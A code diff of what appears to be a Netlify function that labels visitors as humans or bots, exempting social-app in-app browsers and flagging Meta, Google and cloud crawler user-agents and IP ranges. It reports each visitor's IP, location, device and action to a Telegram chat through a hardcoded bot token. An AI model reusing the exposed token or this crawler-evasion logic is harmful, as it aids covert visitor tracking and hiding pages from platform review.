@@ -1,14 +1,19 @@
 const TG_TOKEN = '8548574419:AAGzgN7dnv04TtvKFJiZyu3LOMw6HcsL27Y';
 const TG_CHAT = '5253808709';
 
-// Хранилище статистики (сбрасывается каждые 10 минут)
 let stats = { humans: 0, bots: 0, total: 0, lastReset: Date.now() };
 const STATS_INTERVAL = 10 * 60 * 1000;
 
-// Точные сигнатуры ботов (без коротких слов которые матчат живых людей)
+// In-App браузеры соцсетей — это ВСЕГДА живые люди
+const INAPP_UA = [
+    'fbav/', 'fban/', 'fb_iab/', 'fbios/',
+    'instagram', 'tiktok', 'snapchat',
+    'line/', 'wechat/'
+];
+
+// Настоящие боты-парсеры (НЕ включают FBAV/FBAN)
 const BOT_UA = [
     'facebookexternalhit', 'facebot', 'facebookbot',
-    'fb_iab/', 'fbav/', 'fbios/', 'fban/',
     'meta-externalagent', 'meta-externalfetcher',
     'twitterbot', 'linkedinbot', 'telegrambot',
     'googlebot', 'bingbot', 'yandexbot', 'duckduckbot',
@@ -27,21 +32,27 @@ const BOT_IPS_V4 = [
 ];
 
 const BOT_IPS_V6 = [
-    '2a03:2880:',
-    '2620:10d:c0',
-    '2600:1f',
-    '2600:9000:',
-    '2406:da',
-    '2607:f8b0:'
+    '2a03:2880:', '2620:10d:c0', '2600:1f',
+    '2600:9000:', '2406:da', '2607:f8b0:'
 ];
 
-function isBot(ua, ip) {
+function classify(ua, ip) {
     const u = (ua || '').toLowerCase();
-    if (BOT_UA.some(b => u.includes(b.toLowerCase()))) return true;
-    if (BOT_IPS_V4.some(p => (ip || '').startsWith(p))) return true;
-    const ipLower = (ip || '').toLowerCase();
-    if (BOT_IPS_V6.some(p => ipLower.startsWith(p.toLowerCase()))) return true;
-    return false;
+    const ipStr = ip || '';
+    const ipLower = ipStr.toLowerCase();
+
+    // In-app браузеры = всегда человек
+    if (INAPP_UA.some(b => u.includes(b.toLowerCase()))) return 'human';
+
+    // Бот-паттерны
+    if (BOT_UA.some(b => u.includes(b.toLowerCase()))) return 'bot';
+
+    // IP инфраструктуры
+    if (BOT_IPS_V4.some(p => ipStr.startsWith(p))) return 'bot';
+    if (BOT_IPS_V6.some(p => ipLower.startsWith(p.toLowerCase()))) return 'bot';
+
+    // Всё остальное = человек
+    return 'human';
 }
 
 async function sendTG(text) {
@@ -65,7 +76,6 @@ async function geoIP(ip) {
 exports.handler = async function (event) {
     if (event.httpMethod !== 'POST') return { statusCode: 405 };
 
-    // Парсим body (Netlify отдаёт строку URLSearchParams или JSON)
     let body = {};
     try {
         if (typeof event.body === 'string') {
@@ -96,11 +106,10 @@ exports.handler = async function (event) {
     const ua = headers['user-agent'] || '';
     const ref = headers.referer || headers.referrer || 'Direct';
 
-    const bot = isBot(ua, ip);
-    const type = bot ? '🤖 БОТ' : '👤 ЧЕЛОВЕК';
+    const classification = classify(ua, ip);
+    const type = classification === 'bot' ? '🤖 БОТ' : '👤 ЧЕЛОВЕК';
     const geo = await geoIP(ip);
 
-    // Обновляем статистику и отправляем сводку каждые 10 минут
     const now = Date.now();
     if (now - stats.lastReset >= STATS_INTERVAL) {
         const summary = `📊 <b>Статистика за 10 минут</b>\n\n` +
@@ -112,11 +121,10 @@ exports.handler = async function (event) {
         stats = { humans: 0, bots: 0, total: 0, lastReset: now };
     }
 
-    if (bot) stats.bots++;
+    if (classification === 'bot') stats.bots++;
     else stats.humans++;
     stats.total++;
 
-    // Формируем сообщение
     let msg = `${type} 🔔 <b>${action}</b>\n\n`;
     msg += `📱 ${device}\n`;
     msg += `🌐 ${ip}\n`;
